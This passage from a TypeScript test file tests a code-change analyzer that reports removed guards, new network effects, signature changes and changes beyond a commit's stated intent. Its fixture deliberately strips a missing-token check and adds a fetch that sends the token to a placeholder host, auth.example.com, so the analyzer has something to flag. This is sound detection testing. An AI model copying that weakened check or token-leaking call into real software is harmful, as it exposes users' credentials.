      execFileSync("git", ["-c", "commit.gpgsign=false", ...args], { cwd: repo, stdio: "pipe" });
    git(["init", "-b", "main"]);
    git(["config", "user.email", "t@e.com"]);
    git(["config", "user.name", "T"]);
    mkdirSync(join(repo, "src"), { recursive: true });
    writeFileSync(
      join(repo, "src", "session.ts"),
      [
        "export function validate(token: string): { ok: boolean } {",
        "  if (!token) {",
        '    throw new Error("missing token");',
        "  }",
        "  return { ok: true };",
        "}",
        "",
      ].join("\n"),
    );
    writeFileSync(
      join(repo, "src", "caller.ts"),
      'import { validate } from "./session.js";\nexport const r = validate("x");\n',
    );
    git(["add", "-A"]);
    git(["commit", "-m", "first"]);
    // Removes a guard, widens the return type, and adds a network effect.
    writeFileSync(
      join(repo, "src", "session.ts"),
      [
        "export async function validate(token: string): Promise<{ ok: boolean } | null> {",
        "  const res = await fetch(`https://auth.example.com/${token}`);",
        "  return res.ok ? { ok: true } : null;",
        "}",
        "",
      ].join("\n"),
    );
  });

  it("every id a real analyzer produces starts with its own fact kind", async () => {
    const cs = await extract(repo);
    const facts = await runAnalyzers(cs, createContext(repo, cs.range));
    expect(facts.length).toBeGreaterThan(0);
    for (const fact of facts) {
      expect(fact.id.startsWith(`${fact.kind}:`)).toBe(true);
    }
  });

  it("routes real findings into the lens their kind belongs to", async () => {
    const cs = await extract(repo);
    const findings = rank(await runAnalyzers(cs, createContext(repo, cs.range)));
    const html = renderHtml(model(cs, findings));
    const effects = lens(html, "effects");
    expect(effects).toContain("Guards");
    expect(effects).toContain("guard was removed");
    expect(effects).toContain("Effects");
    expect(effects).toContain("network effect");
    expect(effects).toContain("Contracts");
    expect(effects).toContain("changed its signature");
    // The lens must never be able to claim nothing matched while the
    // narrative lists these same findings.
    expect(effects).not.toContain("Nothing in this range matched this view");
  });

  it("shows a real analyzer's excerpt verbatim in the evidence", async () => {
    const cs = await extract(repo);
    const findings = rank(await runAnalyzers(cs, createContext(repo, cs.range)));
    const html = renderHtml(model(cs, findings));
    for (const e of findings.flatMap((f) => f.evidence)) {
      expect(html).toContain(escaped(e.excerpt));
    }
  });
});

describe("renderHtml beyond stated intent", () => {
  it("puts a second badge beside the tier badge and one legend item", () => {
    const html = renderHtml(
      model(
        noSymbols,
        [finding({ tier: "inferred", beyondIntent: true, claim: { summary: "s", reasoning: "r" } })],
        { model: "claude-opus-5" },
      ),
    );
    expect(html).toContain(`<span class="badge badge-intent">beyond stated intent</span>`);
    // The legend item, in the same shape as the tier legend items.
    expect(html).toContain(
      `<li><span class="badge badge-intent">beyond stated intent</span> `,
    );
    expect(html).toContain(BEYOND_INTENT_MEANING.replace(/"/g, "&quot;"));
  });

  it("renders neither badge nor legend item when no finding carries the mark", () => {
    const html = renderHtml(model(noSymbols, [finding()]));
    // The element, not the bare class name: the stylesheet is a fixed string
    // and carries the `.badge-intent` rule on every document, marked or not —
    // as it carries every other rule for markup this report may not emit.
    // What must be absent is the span and the legend item.
    expect(html).not.toContain(`class="badge badge-intent"`);
    expect(html).not.toContain("beyond stated intent");
  });
});

describe("the intent-gap index", () => {
  const marked = (meta: Partial<ReportMeta> = {}) =>
    buildReportModel(
      changeset,
      [
        finding({
          id: "guard_removed:src/auth.ts:session",
          tier: "inferred",
          file: "src/auth.ts",
          line: 142,
          beyondIntent: true,
        }),
      ],
      { warnings: [], ...meta },
    );

  it("renders the index inside the header, above the lens panes", () => {
    const html = renderHtml(marked());
    expect(html).toContain("Not described by this change&#39;s messages (1)");
    // Target the section markup, never the bare class name: the `.intent-gap`
    // CSS lives in the static STYLE string emitted in <head> on every page,
    // so `indexOf("intent-gap")` finds the stylesheet and is vacuously less
    // than anything in the body.
    expect(html.indexOf('<section class="intent-gap"')).toBeLessThan(
      html.indexOf('class="tabs"'),
    );
  });

  it("keeps the index below the partial-review banner", () => {
    // A disclosure must never be pushed below a block that is not itself one.
    const html = renderHtml(marked({ warnings: ["the surfaceAnalyzer analyzer failed"] }));
    expect(html.indexOf('class="banner"')).toBeLessThan(
      html.indexOf('<section class="intent-gap"'),
    );
  });

  it("renders no index section when nothing is marked", () => {
    // Not `not.toContain("intent-gap")` — the stylesheet always contains it.
    const html = renderHtml(buildReportModel(changeset, [finding()], { warnings: [] }));
    expect(html).not.toContain('<section class="intent-gap"');
  });
});
